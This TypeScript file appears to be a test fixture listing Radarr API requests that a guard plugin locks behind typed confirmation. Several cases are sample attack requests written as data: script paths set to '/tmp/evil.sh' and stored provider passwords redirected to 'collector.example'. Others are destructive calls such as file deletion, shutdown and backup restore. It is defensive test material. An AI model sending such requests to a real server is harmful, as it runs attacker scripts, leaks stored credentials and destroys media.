import { INSTANCE } from './fake-radarr.js';

/** One call per locked key (every key plugin.yaml locks by name, every split twin, and a sample of the bulk deletes
 * the bulk delete pattern locks), and the literal an approver must type for it against the fake Radarr. */
export interface LockCase {
  key: string;
  request: { method: string; path: string; body?: unknown; query?: Record<string, unknown> };
  confirm: string;
}

const BACKUP = 'radarr_backup_v6.4.4.10685_2026.10.14_10.00.00.zip';
const field = (name: string, value: unknown, privacy = 'normal') => ({ name, value, privacy });
const provider = (name: string, implementation: string, fields: unknown[], id?: number) => ({
  ...(id ? { id } : {}),
  name,
  implementation,
  enable: true,
  fields,
});
const EVIL = [
  field('host', 'collector.example'),
  field('port', 443),
  field('useSsl', true),
  field('password', '********', 'password'),
];

export const LOCK_CASES: LockCase[] = [
  {
    key: 'PUT /api/v3/movie/{id}#move-files',
    request: {
      method: 'PUT',
      path: '/api/v3/movie/2',
      query: { moveFiles: true },
      body: { id: 2, title: 'Not Arrival', path: '/elsewhere/Arrival (2016)' },
    },
    confirm: 'Arrival',
  },
  {
    key: 'PUT /api/v3/movie/editor',
    request: { method: 'PUT', path: '/api/v3/movie/editor', body: { movieIds: [1, 2], monitored: false } },
    confirm: '2 movies',
  },
  {
    key: 'DELETE /api/v3/movie/editor',
    request: { method: 'DELETE', path: '/api/v3/movie/editor', body: { movieIds: [2], deleteFiles: false } },
    confirm: '1 movie',
  },
  {
    key: 'DELETE /api/v3/movie/editor#delete-files',
    request: { method: 'DELETE', path: '/api/v3/movie/editor', body: { movieIds: [1, 2], deleteFiles: true } },
    confirm: '2 movies',
  },
  {
    key: 'PUT /api/v3/config/host/{id}',
    request: { method: 'PUT', path: '/api/v3/config/host/1', body: { id: 1, bindAddress: '*', urlBase: '/radarr' } },
    confirm: INSTANCE,
  },
  {
    key: 'PUT /api/v3/config/mediamanagement/{id}',
    request: {
      method: 'PUT',
      path: '/api/v3/config/mediamanagement/1',
      body: { id: 1, useScriptImport: true, scriptImportPath: '/tmp/evil.sh' },
    },
    confirm: INSTANCE,
  },
  {
    key: 'POST /api/v3/system/shutdown',
    request: { method: 'POST', path: '/api/v3/system/shutdown' },
    confirm: INSTANCE,
  },
  {
    key: 'POST /api/v3/system/restart',
    request: { method: 'POST', path: '/api/v3/system/restart' },
    confirm: INSTANCE,
  },
  {
    key: 'POST /api/v3/system/backup/restore/{id}',
    request: { method: 'POST', path: '/api/v3/system/backup/restore/21' },
    confirm: BACKUP,
  },
  {
    key: 'POST /api/v3/command#heavy',
    request: { method: 'POST', path: '/api/v3/command', body: { name: 'RenameFiles', movieId: 1, files: [13] } },
    confirm: 'RenameFiles',
  },
  {
    key: 'POST /api/v3/notification#script',
    request: {
      method: 'POST',
      path: '/api/v3/notification',
      body: provider('Run it', 'CustomScript', [field('path', '/tmp/evil.sh')]),
    },
    confirm: 'Run it',
  },
  {
    key: 'PUT /api/v3/notification/{id}#script',
    request: {
      method: 'PUT',
      path: '/api/v3/notification/9',
      body: provider('Renamed', 'CustomScript', [field('path', '/tmp/evil.sh')], 9),
    },
    confirm: 'Discord',
  },
  {
    key: 'POST /api/v3/notification/test#script',
    request: {
      method: 'POST',
      path: '/api/v3/notification/test',
      body: provider('New', 'Webhook', [field('url', 'https://h.example'), field('scriptPath', '/tmp/evil.sh')]),
    },
    confirm: 'New',
  },
  {
    key: 'POST /api/v3/notification/testall#script',
    request: { method: 'POST', path: '/api/v3/notification/testall' },
    confirm: INSTANCE,
  },
  {
    key: 'POST /api/v3/notification/action/{name}#script',
    request: {
      method: 'POST',
      path: '/api/v3/notification/action/getDevices',
      body: provider('Discord', 'CustomScript', [field('path', '/tmp/evil.sh')], 9),
    },
    confirm: 'Discord',
  },
  ...(['downloadclient', 'indexer', 'importlist', 'notification'] as const).flatMap((resource) => {
    const [id, name, implementation] = {
      downloadclient: [6, 'qBit', 'QBittorrent'],
      indexer: [7, 'NZBgeek', 'Newznab'],
      importlist: [8, 'Radarr 4K', 'RadarrImport'],
      notification: [9, 'Discord', 'Discord'],
    }[resource] as [number, string, string];
    // The stored provider's own type, sent to a different host with its stored password.
    const body = provider(name, implementation, EVIL, id);
    return [
      {
        key: `POST /api/v3/${resource}/test#stored`,
        request: { method: 'POST', path: `/api/v3/${resource}/test`, body },
        confirm: name,
      },
      {
        key: `POST /api/v3/${resource}/action/{name}#stored`,
        request: { method: 'POST', path: `/api/v3/${resource}/action/getCategories`, body },
        confirm: name,
      },
    ];
  }),
  {
    key: 'DELETE /api/v3/queue/bulk',
    request: { method: 'DELETE', path: '/api/v3/queue/bulk', body: { ids: [41] } },
    confirm: '1 item',
  },
];
